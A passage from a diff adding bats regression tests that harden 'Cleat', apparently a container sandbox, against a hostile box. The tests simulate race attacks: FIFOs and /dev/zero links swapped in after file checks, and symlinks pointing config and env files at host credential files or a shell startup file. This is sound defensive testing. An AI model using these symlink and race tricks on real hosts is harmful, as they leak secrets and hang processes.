+# session. A rotation done by the bridge, which runs in the background, never
+# reset that offset, so it pointed past the end of the new file and the drops
+# of the rest of the session were never reported.
+@test "regression v1.5.4: a rotated hook drop log silenced the session-end report" {
+  mkdir -p "$CLEAT_STATE_DIR"
+  printf 'now\t%s\tjson\tbox-a\tmd5\t0\ttext\n' "$_HOOK_DROP_MARK" > "$CLEAT_STATE_DIR/hook-drops.log"
+  run _maybe_report_hook_drops "$CLEAT_STATE_DIR/hook-drops.log" 5000 box-a
+  assert_success
+  assert_output --partial "Dropped"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: host readers of names the box can write. .cleat, .cleat.env, a [setup]
+# script, the hook spool and the session-end logs all sit in a mount the box
+# writes. A FIFO there blocks open(2) until something writes to it, a link to
+# /dev/zero never reaches EOF, and the box can swap either in after a check.
+# Sizes now come from a stat and content from _read_bounded.
+#
+# Helpers. _rd_start runs a command in the background in a process group of
+# its own. _rd_wait_pid waits for it to end, and after the deadline kills the
+# whole group (a subshell stuck on a FIFO or spinning on /dev/zero included),
+# hands the FIFO a writer and leaves a regular file at its name. Nothing a
+# reverted fix left blocked may outlive the test, because it would hold bats'
+# descriptors and hang the file. _rd_swap_on_open puts stand-ins for head,
+# tail and cat on PATH. The first one handed <target> as its last argument
+# swaps that name for a FIFO and then execs the real tool, which is the instant
+# between Cleat's check and its open, made deterministic. It records that it
+# fired, so a reader that never reached the tools cannot pass by reading
+# nothing.
+_rd_start() {
+  set -m
+  "$@" </dev/null >"$TEST_TEMP/rd.out" 2>&1 3>&- &
+  _RD_PID=$!
+  set +m
+}
+
+_rd_wait_pid() {
+  local secs="$1" pid="$2" fifo="${3:-}" i=0 n st
+  n=$(( secs * 10 ))
+  while [ "$i" -lt "$n" ]; do
+    kill -0 "$pid" 2>/dev/null || { wait "$pid" 2>/dev/null; return 0; }
+    st="$(_proc_state "$pid")"
+    case "$st" in Z*) wait "$pid" 2>/dev/null; return 0 ;; esac
+    sleep 0.1
+    i=$(( i + 1 ))
+  done
+  kill -9 -- "-$pid" 2>/dev/null || true
+  kill -9 "$pid" 2>/dev/null || true
+  if [ -n "$fifo" ] && [ -p "$fifo" ]; then
+    exec 4<>"$fifo"
+    rm -f "$fifo"
+    : > "$fifo"
+    exec 4>&-
+  fi
+  wait "$pid" 2>/dev/null || true
+  return 1
+}
+
+_rd_finishes_within() {
+  local secs="$1" fifo="$2"
+  shift 2
+  _rd_start "$@"
+  _rd_wait_pid "$secs" "$_RD_PID" "$fifo"
+}
+
+_rd_swap_on_open() {
+  local target="$1" d t real
+  [ -n "${_RD_ORIG_PATH:-}" ] || _RD_ORIG_PATH="$PATH"
+  d="$(mktemp -d "$TEST_TEMP/swap.XXXXXX")"
+  for t in head tail cat; do
+    real="$(PATH="$_RD_ORIG_PATH"; command -v "$t")"
+    cat > "$d/$t" <<EOF
+#!/bin/sh
+for a in "\$@"; do last="\$a"; done
+if [ "\$last" = "$target" ] && mkdir "$d/fired" 2>/dev/null; then
+  rm -f "$target"
+  mkfifo "$target"
+fi
+exec "$real" "\$@"
+EOF
+    chmod +x "$d/$t"
+  done
+  PATH="$d:$_RD_ORIG_PATH"
+  _RD_SWAP_DIR="$d"
+}
+
+# _rd_swap_on_open, but for a size read: _path_size sizes with stat, never
+# head/tail/cat, so the swap fires from a stat stand-in. The first stat handed
+# <target> as its last argument swaps it for a FIFO and then execs the real
+# stat, which the fixed reader answers 0 for without opening. A reader that
+# opens instead never reaches stat, so the swap never fires: the fired marker
+# stays absent and the size read comes back off the un-swapped file.
+_rd_stat_swap() {
+  local target="$1" d real
+  [ -n "${_RD_ORIG_PATH:-}" ] || _RD_ORIG_PATH="$PATH"
+  d="$(mktemp -d "$TEST_TEMP/statswap.XXXXXX")"
+  real="$(PATH="$_RD_ORIG_PATH"; command -v stat)"
+  cat > "$d/stat" <<EOF
+#!/bin/sh
+for a in "\$@"; do last="\$a"; done
+if [ "\$last" = "$target" ] && mkdir "$d/fired" 2>/dev/null; then
+  rm -f "$target"
+  mkfifo "$target"
+fi
+exec "$real" "\$@"
+EOF
+  chmod +x "$d/stat"
+  PATH="$d:$_RD_ORIG_PATH"
+  _RD_SWAP_DIR="$d"
+}
+
+# A FIFO .cleat reached the launch fingerprint, which reads [resources] with no
+# -f gate and no trust check, and hung every launch of the project until
+# Ctrl-C. No race needed. A link to /dev/zero spun instead.
+@test "regression v1.5.4: a FIFO or device .cleat does not hang the launch fingerprint" {
+  local p="$TEST_TEMP/fp-proj" want
+  mkdir -p "$p"
+  ACTIVE_CAPS=()
+  _RESOLVED_ENV_ARGS=()
+  want="$(compute_config_fingerprint "$p")"
+  mkfifo "$p/.cleat"
+  _rd_finishes_within 5 "$p/.cleat" compute_config_fingerprint "$p" \
+    || fail "the launch fingerprint blocked on a FIFO .cleat"
+  run cat "$TEST_TEMP/rd.out"
+  assert_output "$want"
+  rm -f "$p/.cleat"
+  ln -s /dev/zero "$p/.cleat"
+  _rd_finishes_within 5 "" compute_config_fingerprint "$p" \
+    || fail "the launch fingerprint never finished reading a .cleat linked to /dev/zero"
+  run cat "$TEST_TEMP/rd.out"
+  assert_output "$want"
+}
+
+# The other .cleat and .cleat.env readers had the same -r-only gate.
+@test "regression v1.5.4: no .cleat reader opens a FIFO" {
+  local p="$TEST_TEMP/fifo-proj"
+  mkdir -p "$p"
+  mkfifo "$p/.cleat" "$p/.cleat.env"
+  _rd_finishes_within 3 "$p/.cleat" _cleat_section_present "$p/.cleat" caps \
+    || fail "_cleat_section_present opened the FIFO"
+  _rd_finishes_within 3 "$p/.cleat" _read_caps_from_file "$p/.cleat" \
+    || fail "_read_caps_from_file opened the FIFO"
+  _rd_finishes_within 3 "$p/.cleat" _read_setup_from_file "$p/.cleat" \
+    || fail "_read_setup_from_file opened the FIFO"
+  _rd_finishes_within 3 "$p/.cleat" _read_section_all_from_file "$p/.cleat" fork exclude \
+    || fail "_read_section_all_from_file opened the FIFO"
+  _rd_finishes_within 3 "$p/.cleat" _warn_unknown_cleat_sections "$p/.cleat" project \
+    || fail "_warn_unknown_cleat_sections opened the FIFO"
+  _rd_finishes_within 3 "$p/.cleat.env" _parse_env_file "$p/.cleat.env" \
+    || fail "_parse_env_file opened the FIFO"
+}
+
+# A regular .cleat passes the gate, and the box swaps a FIFO in before the read.
+@test "regression v1.5.4: a .cleat swapped for a FIFO after its check is read under a time bound" {
+  local p="$TEST_TEMP/swap-proj"
+  mkdir -p "$p"
+  printf '[caps]\ngit\n' > "$p/.cleat"
+  _BOX_FILE_READ_SECS=1
+  _rd_swap_on_open "$p/.cleat"
+  _rd_finishes_within 8 "$p/.cleat" _read_caps_from_file "$p/.cleat" \
+    || fail "the read of a .cleat swapped for a FIFO was not bounded"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+}
+
+# The script passed -f, -L and the containment checks, then `cat` opened
+# whatever the box had put at the name by then.
+@test "regression v1.5.4: a setup script swapped for a FIFO after its checks does not hang the payload" {
+  local p="$TEST_TEMP/setup-proj"
+  mkdir -p "$p"
+  printf '[setup]\nscript provision.sh\n' > "$p/.cleat"
+  printf 'echo provisioned\n' > "$p/provision.sh"
+  _BOX_FILE_READ_SECS=1
+  _rd_swap_on_open "$p/provision.sh"
+  _rd_finishes_within 8 "$p/provision.sh" _build_setup_payload "$p" main \
+    || fail "the setup payload blocked on a script swapped for a FIFO"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+}
+
+# Refused whole, before a byte of it is read, rather than cut at the read bound.
+@test "regression v1.5.4: a setup script over 1 MiB is refused before it is read" {
+  local p="$TEST_TEMP/big-proj"
+  mkdir -p "$p"
+  printf '[setup]\nscript big.sh\n' > "$p/.cleat"
+  head -c 1048577 /dev/zero | tr '\0' '#' > "$p/big.sh"
+  run _build_setup_payload "$p" main
+  assert_failure
+  assert_output --partial "larger than 1 MiB"
+  refute_output --partial "# cleat setup: begin script"
+}
+
+# The bridge sized the spool with `wc -c <`, which opens it. A FIFO swapped in
+# blocked that open, and bash holds the session-end TERM while a command
+# substitution waits, so the bridge outlived its session. The loop's size read
+# now comes before its shape check, so this swap needs no race. The start offset
+# is read after the start pass, which stands in for a swap won there.
+@test "regression v1.5.4: the hook bridge sizes its spool without opening it" {
+  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid
+  mkdir -p "${spool%/*}"
+  : > "$spool"
+  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
+  bpid=$_RD_PID
+  sleep 1.2
+  rm -f "$spool"
+  mkfifo "$spool"
+  _rd_wait_pid 4 "$bpid" "$spool" || fail "the bridge opened a FIFO swapped in for its spool"
+  run test -p "$spool"
+  assert_failure
+  : > "$spool"
+  _hook_spool_cap() { rm -f "$1"; mkfifo "$1"; return 1; }
+  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
+  bpid=$_RD_PID
+  _rd_wait_pid 4 "$bpid" "$spool" || fail "the bridge opened the spool to size its start offset"
+  run test -p "$spool"
+  assert_failure
+}
+
+# And the window read, a tail from the offset. The spool starts with one line
+# from a prior session, so the window starts past byte 1 and the tail branch
+# of the bounded read is the one that opens.
+@test "regression v1.5.4: a hook spool swapped for a FIFO before the window read does not wedge the bridge" {
+  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid
+  mkdir -p "${spool%/*}"
+  printf '{"hook_event_name":"Stop"}\n' > "$spool"
+  _BOX_FILE_READ_SECS=1
+  # Before the bridge starts, which takes PATH with it.
+  _rd_swap_on_open "$spool"
+  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
+  bpid=$_RD_PID
+  sleep 1.2
+  printf '{"hook_event_name":"Stop"}\n' >> "$spool"
+  _rd_wait_pid 8 "$bpid" "$spool" || fail "the bridge wedged on a spool swapped for a FIFO before its read"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+  run test -p "$spool"
+  assert_failure
+}
+
+# The session-end reports read .watcher-log and .proxy-log in the clip dir the
+# box mounts read-write. `[ -f ]` follows a link, so a link there made them read
+# a host file. Only a yes or no or a count came of it, but it is never Cleat's.
+# Both logs have since moved to host-only dirs (bridge/ and logs/). The guards
+# stay as a second layer, so these still hand the reports a clip path.
+@test "regression v1.5.4: session-end reports never follow a link planted as their log" {
+  local clip="$TEST_TEMP/clip-links" host="$TEST_TEMP/host-log"
+  mkdir -p "$clip"
+  {
+    echo "bash: fork: retry: Resource temporarily unavailable"
+    echo "[browser-watcher 12:00:00] ${_BROWSER_BLOCKED_MARK} origin=blocked.example url=https://blocked.example/a"
+    echo "[browser-watcher 12:00:00] ${_BROWSER_CAPPED_MARK} limit=${_BROWSER_RATE_PER_MIN}/min,${_BROWSER_RATE_PER_SESSION}/session url=https://capped.example/b"
+    echo "[browser-watcher 12:00:00] ${_BROWSER_NOBIND_MARK} deferring URL to terminal (callback port unavailable) url=https://nobind.example/c"
+  } > "$host"
+  # The same lines as regular logs are reported, so the lines match.
+  cp "$host" "$clip/.watcher-log"
+  cp "$host" "$clip/.proxy-log"
+  run _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0
+  assert_output --partial "process slots"
+  run _maybe_report_blocked_opens "$clip/.proxy-log" 0
+  assert_output --partial "blocked.example"
+  assert_output --partial "capped.example"
+  assert_output --partial "nobind.example"
+  rm -f "$clip/.watcher-log" "$clip/.proxy-log"
+  ln -s "$host" "$clip/.watcher-log"
+  ln -s "$host" "$clip/.proxy-log"
+  run _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0
+  assert_success
+  assert_output ""
+  run _maybe_report_capped_opens "$clip/.proxy-log" 0
+  assert_success
+  assert_output ""
+  run _maybe_report_nobind_opens "$clip/.proxy-log" 0
+  assert_success
+  assert_output ""
+  run _maybe_report_blocked_opens "$clip/.proxy-log" 0
+  assert_success
+  assert_output ""
+}
+
+# And a FIFO swapped in after that check blocked the report's tail, which runs
+# at session end after the box has had the whole session to set it up.
+@test "regression v1.5.4: session-end reports do not hang on a log swapped for a FIFO after the check" {
+  local clip="$TEST_TEMP/clip-swap"
+  mkdir -p "$clip"
+  _BOX_FILE_READ_SECS=1
+  # From the start of the log, the head branch.
+  echo "prior" > "$clip/.watcher-log"
+  _rd_swap_on_open "$clip/.watcher-log"
+  _rd_finishes_within 6 "$clip/.watcher-log" _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0 \
+    || fail "the fork report blocked on a swapped log"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+  # From past a prior session's line, the tail branch.
+  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
+  _rd_swap_on_open "$clip/.proxy-log"
+  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_capped_opens "$clip/.proxy-log" 6 \
+    || fail "the rate cap report blocked on a swapped log"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
+  _rd_swap_on_open "$clip/.proxy-log"
+  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_nobind_opens "$clip/.proxy-log" 6 \
+    || fail "the busy callback port report blocked on a swapped log"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+  # The refusal report's own read, with the two reports it calls first quiet.
+  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
+  _maybe_report_capped_opens() { :; }
+  _maybe_report_nobind_opens() { :; }
+  _rd_swap_on_open "$clip/.proxy-log"
+  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_blocked_opens "$clip/.proxy-log" 6 \
+    || fail "the refusal report blocked on a swapped log"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+}
+
+
+# The session list sized each transcript with `wc -c <`, which opens it, inside
+# a plain -f gate. A device symlink swapped in after the gate read forever and a
+# FIFO blocked on the open. The size now comes from a stat, which reads a FIFO
+# or a device as 0 without opening it. The stat stand-in swaps the checked
+# regular transcript for a FIFO at the instant of the size read, so the fixed
+# reader stats a FIFO and returns 0; a reverted reader never stats, opens the
+# un-swapped file and reports its real KB.
+@test "regression v1.5.4: a session size read stats the transcript instead of opening it" {
+  local sdir="$TEST_TEMP/sess" uuid="00000000-0000-4000-8000-0000000000aa"
+  mkdir -p "$sdir"
+  # Over 1 KiB, so a reader that opens the file reports a nonzero KB.
+  head -c 4096 /dev/zero | tr '\0' 'x' > "$sdir/$uuid.jsonl"
+  _rd_stat_swap "$sdir/$uuid.jsonl"
+  _rd_finishes_within 6 "$sdir/$uuid.jsonl" _sessions_size_kb "$sdir" "$uuid" \
+    || fail "the session size read blocked on a transcript swapped for a FIFO"
+  PATH="$_RD_ORIG_PATH"
+  run cat "$TEST_TEMP/rd.out"
+  assert_output "0"
+  run test -d "$_RD_SWAP_DIR/fired"
+  assert_success
+}
+
+# The credential file sits in the box's auth dir, read-write. It passed the -f
+# and -L checks, then the open ran unbounded, so a FIFO the box swapped in
+# between the mktemp and the open hung open(2) forever and only the account
+# lock's age bound ever freed the next command. The open runs under the time
+# bound now, like _read_unlinked_bounded. mktemp is the deterministic instant
+# between the check and the open, and runs in both the bounded and the reverted
+# unbounded code.
+@test "regression v1.5.4: a credential file swapped for a FIFO after its check is read under a time bound" {
+  local src="$TEST_TEMP/auth/.credentials.json"
+  mkdir -p "${src%/*}"
+  printf '{"claudeAiOauth":{"accessToken":"a","refreshToken":"r"}}\n' > "$src"
+  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/accounts"
+  _BOX_FILE_READ_SECS=1
+  # After the -f/-L check, before the open, in both code paths.
+  mktemp() {
+    if [ ! -p "$src" ]; then rm -f "$src"; mkfifo "$src"; fi
+    command mktemp "$@"
+  }
+  _rd_finishes_within 6 "$src" _account_snapshot_cred "$src" \
+    || fail "the credential open blocked on a FIFO swapped in after its check"
+  unset -f mktemp
+  # The bounded open gave up, so nothing was snapshotted.
+  run cat "$TEST_TEMP/rd.out"
+  assert_output ""
+}
+
+# ── v1.5.4: one read decides the project caps ────────────────────────────────
+#
+# resolve_caps applied the caps from its own read of .cleat, while the trust
+# check hashed a second read, the prompt listed a third and recorded the hash of
+# a fourth. .cleat sits in /workspace, so the box can flip it between any two.
+# Every test here models that flip at the exact point one read used to happen.
+
+# The trust lookup stands in for the moment between resolve_caps' read and the
+# check's own: the box puts back the file the user trusted.
+@test "regression v1.5.4: project caps apply from the same read the trust check hashed" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/sameread" h
+  mkdir -p "$p"
+  printf '[caps]\ngit\n' > "$p/.cleat"
+  h="$(_hash_cleat_caps "$p/.cleat" main)"
+  _trust_record "$p" "$h" main
+  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
+  _SAMEREAD_H="$h"
+  _trust_lookup() { printf '[caps]\ngit\n' > "$1/.cleat"; printf '%s\n' "$_SAMEREAD_H"; }
+  _is_tty() { return 1; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/sameread.out" 2>&1
+  run cap_is_active docker
+  assert_failure
+}
+
+# cmd_start resolves caps, then a recreate through cmd_run resolves them again
+# in the same process. The session cache held a bare "approved".
+@test "regression v1.5.4: an in-process approval does not carry over to a rewritten .cleat" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/sesscache"
+  mkdir -p "$p"
+  printf '[caps]\ngit\n' > "$p/.cleat"
+  _trust_record "$p" "$(_hash_cleat_caps "$p/.cleat" main)" main
+  _is_tty() { return 1; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/sesscache.1" 2>&1
+  run cap_is_active git
+  assert_success
+  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
+  resolve_caps "$p" > "$TEST_TEMP/sesscache.2" 2>&1
+  run cap_is_active docker
+  assert_failure
+}
+
+# The prompt listed one read and recorded the hash of another, taken just
+# before it. The hash function stands in for that second read.
+@test "regression v1.5.4: the trust prompt records the caps it showed, not a second read" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/shown" ben
+  mkdir -p "$p"
+  printf '[caps]\ngit\n' > "$p/.cleat"
+  ben="$(_hash_cleat_caps "$p/.cleat" main)"
+  eval "_real_hash_cleat_caps() $(declare -f _hash_cleat_caps | sed 1d)"
+  _hash_cleat_caps() { printf '[caps]\ngit\ndocker\n' > "$1"; _real_hash_cleat_caps "$@"; }
+  _is_tty() { return 0; }
+  _SHOWN_OUT="$TEST_TEMP/shown.caps"
+  _trust_prompt() { shift; printf '%s\n' "$@" > "$_SHOWN_OUT"; return 0; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/shown.out" 2>&1
+  run cat "$_SHOWN_OUT"
+  assert_output "git"
+  run _trust_lookup "$p" main
+  assert_output "$ben"
+}
+
+# cmd_trust hashed one read and printed "Approved caps" from a later one, so it
+# could tell the user it approved git while recording git and docker.
+@test "regression v1.5.4: cleat trust prints the caps it records" {
+  local p="$TEST_TEMP/trustprint" hmal
+  mkdir -p "$p"
+  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
+  hmal="$(_hash_cleat_caps "$p/.cleat" main)"
+  _TRUSTPRINT_P="$p"
+  _build_setup_payload() { printf '[caps]\ngit\n' > "$_TRUSTPRINT_P/.cleat"; }
+  run cmd_trust "$p"
+  assert_success
+  assert_output --partial "Approved caps: docker,git"
+  run _trust_lookup "$p" main
+  assert_output "$hmal"
+}
+
+# One line `docker,git` is no cap at all, yet it hashed exactly like the two
+# lines docker and git, so approving the inert line trusted the real pair.
+@test "regression v1.5.4: an approved inert cap line cannot later stand for real caps" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/inert"
+  mkdir -p "$p"
+  printf '[caps]\ndocker,git\n' > "$p/.cleat"
+  _is_tty() { return 0; }
+  _trust_prompt() { return 0; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/inert.1" 2>&1
+  printf '[caps]\ndocker\ngit\n' > "$p/.cleat"
+  _TRUST_SESSION_DECISION=""
+  _TRUST_SESSION_PROJECT=""
+  _TRUST_SESSION_BOX=""
+  _is_tty() { return 1; }
+  resolve_caps "$p" > "$TEST_TEMP/inert.2" 2>&1
+  run cap_is_active docker
+  assert_failure
+}
+
+# ── v1.5.4: bare names in a project env file behind trust ───────────────────
+#
+# A bare KEY line in .cleat.env (or .cleat.<box>.env) copied the host's value
+# of KEY into the box with no approval at all. The file sits in /workspace, so
+# the box, or a cloned repo, picked which host secrets left the shell. The set
+# of bare names now joins the project trust decision.
+
+# The box writes the name of a host secret into .cleat.env. Non-TTY, no opt-in.
+@test "regression v1.5.4: a project env file cannot copy a host variable into an untrusted box" {
+  unset CLEAT_TRUST_PROJECT
+  mock_docker_images "cleat"
+  mkdir -p "$TEST_TEMP/project"
+  local cname
+  cname="$(container_name_for "$TEST_TEMP/project")"
+  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
+  export CLEAT_R154_HOST_SECRET=host-only-value
+  printf 'CLEAT_R154_HOST_SECRET\nLITERAL_OK=1\n' > "$TEST_TEMP/project/.cleat.env"
+  _is_tty() { return 1; }
+  run cmd_run "$TEST_TEMP/project"
+  unset CLEAT_R154_HOST_SECRET
+  assert_success
+  assert_output --partial "Not passing the host variables"
+  assert_output --partial "CLEAT_R154_HOST_SECRET"
+  run assert_docker_run_has "$cname" "LITERAL_OK=1"
+  assert_success
+  run grep -q host-only-value "$DOCKER_CALLS"
+  assert_failure
+}
+
+# An approval covers the names it was given for. The box adds one more.
+@test "regression v1.5.4: a new host variable in the project env file needs fresh approval" {
+  local p="$TEST_TEMP/project"
+  mkdir -p "$p"
+  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
+  printf 'R154_FIRST\n' > "$p/.cleat.env"
+  export R154_FIRST=first-value R154_SECOND=second-value
+  _is_tty() { return 1; }
+  _BOX=main
+  export CLEAT_TRUST_PROJECT=1
+  resolve_caps "$p" > "$TEST_TEMP/fresh.1" 2>&1
+  resolve_env_args "$p" >> "$TEST_TEMP/fresh.1" 2>&1
+  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
+  assert_output --partial "R154_FIRST=first-value"
+  unset CLEAT_TRUST_PROJECT
+  _TRUST_SESSION_DECISION=""
+  printf 'R154_FIRST\nR154_SECOND\n' > "$p/.cleat.env"
+  resolve_caps "$p" > "$TEST_TEMP/fresh.2" 2>&1
+  resolve_env_args "$p" >> "$TEST_TEMP/fresh.2" 2>&1
+  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
+  unset R154_FIRST R154_SECOND
+  refute_output --partial "second-value"
+  run cat "$TEST_TEMP/fresh.2"
+  assert_output --partial "R154_SECOND"
+}
+
+# Folding the names in must not re-prompt the projects that ask for none: their
+# trust rows were written by v1.5.3 over the caps alone.
+@test "regression v1.5.4: a project env file with no host variables keeps its trust hash" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/project"
+  mkdir -p "$p"
+  printf '[caps]\ngit\nenv\n' > "$p/.cleat"
+  printf 'LITERAL_ONLY=1\n# COMMENTED_NAME\n' > "$p/.cleat.env"
+  _trust_record "$p" "$(printf 'env,git' | _md5 | awk '{print $1}')" main
+  _is_tty() { return 1; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/stable.out" 2>&1
+  run cap_is_active git
+  assert_success
+  run cat "$TEST_TEMP/stable.out"
+  refute_output --partial "skipped"
+  refute_output --partial "not trusted"
+}
+
+# Git stores symlinks, so a cloned repo can ship .cleat.env pointing at any
+# file the user can read. Relative on purpose: that is the shape a clone brings.
+@test "regression v1.5.4: a symlinked project env file is not read" {
+  mock_docker_images "cleat"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/hostdir"
+  local cname
+  cname="$(container_name_for "$TEST_TEMP/project")"
+  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
+  printf 'aws_secret_access_key = host-file-secret\nexport R154_RC=rc-secret\n' > "$TEST_TEMP/hostdir/credentials"
+  ln -s ../hostdir/credentials "$TEST_TEMP/project/.cleat.env"
+  printf 'GLOBAL_OK=1\n' > "$CLEAT_GLOBAL_ENV"
+  run cmd_run "$TEST_TEMP/project"
+  assert_success
+  assert_output --partial "is a symlink and was not read"
+  run assert_docker_run_has "$cname" "GLOBAL_OK=1"
+  assert_success
+  run grep -q 'host-file-secret' "$DOCKER_CALLS"
+  assert_failure
+  run grep -q 'rc-secret' "$DOCKER_CALLS"
+  assert_failure
+}
+
+# A regular .cleat.env passes the checks. The box swaps in a link before the
+# open. The time bound's argv builder runs in that gap.
+@test "regression v1.5.4: a project env file swapped for a link before its open is not read" {
+  local p="$TEST_TEMP/project"
+  mkdir -p "$p" "$TEST_TEMP/hostdir"
+  printf 'SECRET_LINE=host-file-secret\n' > "$TEST_TEMP/hostdir/credentials"
+  printf 'PLAIN=1\n' > "$p/.cleat.env"
+  _R154_SWAP_F="$p/.cleat.env"
+  _R154_SWAP_T="$TEST_TEMP/hostdir/credentials"
+  eval "_r154_real_bounded_argv() $(declare -f _bounded_argv | sed 1d)"
+  _bounded_argv() { rm -f "$_R154_SWAP_F"; ln -s "$_R154_SWAP_T" "$_R154_SWAP_F"; _r154_real_bounded_argv "$@"; }
+  run _read_unlinked_bounded "$p/.cleat.env" 4096
+  assert_success
+  refute_output --partial "host-file-secret"
+}
+
+# The open went through a link, the box put a regular file back for the -L test
+# and the link again for the listing. `ls -L` then named the file the
+# descriptor held and the check passed.
+@test "regression v1.5.4: the descriptor check lists the path without following it" {
+  _R154_HELD="$TEST_TEMP/held"
+  _R154_PATH="$TEST_TEMP/named"
+  printf 'X=1\n' > "$_R154_HELD"
+  printf 'Y=2\n' > "$_R154_PATH"
+  exec 7<"$_R154_HELD"
+  ls() {
+    local last
+    for last in "$@"; do :; done
+    if [[ "$last" == "$_R154_PATH" ]]; then
+      rm -f "$_R154_PATH"
+      ln -s "$_R154_HELD" "$_R154_PATH"
+    fi
+    command ls "$@"
+  }
+  run _fd_holds_path 7 "$_R154_PATH"
+  exec 7<&-
+  unset -f ls
+  assert_failure
+}
+
+# The prompt listed one read of .cleat.env and the host values came from
+# another. The box adds a name while the user reads the prompt.
+@test "regression v1.5.4: host variables apply from the same read the trust prompt showed" {
+  unset CLEAT_TRUST_PROJECT
+  local p="$TEST_TEMP/project"
+  mkdir -p "$p"
+  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
+  printf 'R154_SHOWN\n' > "$p/.cleat.env"
+  export R154_SHOWN=shown-value R154_ADDED=added-value
+  _R154_ENV="$p/.cleat.env"
+  _is_tty() { return 0; }
+  _trust_prompt() { printf 'R154_SHOWN\nR154_ADDED\n' > "$_R154_ENV"; return 0; }
+  _BOX=main
+  resolve_caps "$p" > "$TEST_TEMP/shownenv.out" 2>&1
+  resolve_env_args "$p" >> "$TEST_TEMP/shownenv.out" 2>&1
+  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
+  unset R154_SHOWN R154_ADDED
+  assert_output --partial "R154_SHOWN=shown-value"
+  refute_output --partial "added-value"
+  run _trust_lookup "$p" main
+  assert_output "$(_trust_decision_hash "" "R154_SHOWN")"
+}
+
+# The writers staged the new .cleat beside it as .cleat.cleat-tmp.<pid> (and
+# .cleat.cleat-note.<pid>), opened with a plain redirect. The workspace is the
+# box's, so it planted a link at every pid and the next `cleat config` wrote
+# the new .cleat, box-authored sections included, into a host file such as
+# ~/.zshenv.
+@test "regression v1.5.4: a .cleat edit never writes through a link planted at its temp name" {
+  local proj="$TEST_TEMP/proj" victim="$TEST_TEMP/host-zshenv"
+  mkdir -p "$proj"
+  printf 'export HOST=1\n' > "$victim"
+  printf '[caps]\ngit\n' > "$proj/.cleat"
+  ln -s "$victim" "$proj/.cleat.cleat-tmp.$$"
+  ln -s "$victim" "$proj/.cleat.cleat-note.$$"
+  _write_caps_to_file "$proj/.cleat" ssh
+  _write_resources_to_file "$proj/.cleat" 4g ""
+  _config_write_caps_scoped "$proj/.cleat" box.web.caps web git
+  run cat "$victim"
+  assert_output "export HOST=1"
+  run cat "$proj/.cleat"
+  assert_output --partial "memory = 4g"
+  assert_output --partial "[box.web.caps]"
+  assert_output --partial "# Per-box config"
+}
+
+# [[ -f ]] and `< "$file"` followed a link, and the rename then put the bytes
+# back as a regular .cleat in /workspace: a box that planted
+# .cleat -> ../../.aws/credentials read the secret after the next edit.
+@test "regression v1.5.4: a .cleat linked to a host file is refused, never copied into the workspace" {
+  local proj="$TEST_TEMP/proj" host="$TEST_TEMP/host-credentials"
+  mkdir -p "$proj"
+  printf '[default]\naws_secret_access_key = HOSTSECRET\n' > "$host"
+  ln -s "$host" "$proj/.cleat"
+  run _write_caps_to_file "$proj/.cleat" git
+  assert_failure
+  assert_output --partial "Refusing to edit"
+  run _write_resources_to_file "$proj/.cleat" 4g ""
+  assert_failure
+  assert_output --partial "Refusing to edit"
+  [ -L "$proj/.cleat" ] || { echo ".cleat is no longer the link"; return 1; }
+  run grep -rl HOSTSECRET "$proj" "$CLEAT_CONFIG_DIR"
+  assert_output ""
+  run cat "$host"
+  assert_output "$(printf '[default]\naws_secret_access_key = HOSTSECRET')"
+}
+
+# A dangling link fails [[ -f ]], so the generate row took .cleat as fresh and
+# wrote its header with `> "$file"`, creating the link's target on the host.
+@test "regression v1.5.4: generate never creates the file a dangling .cleat link names" {
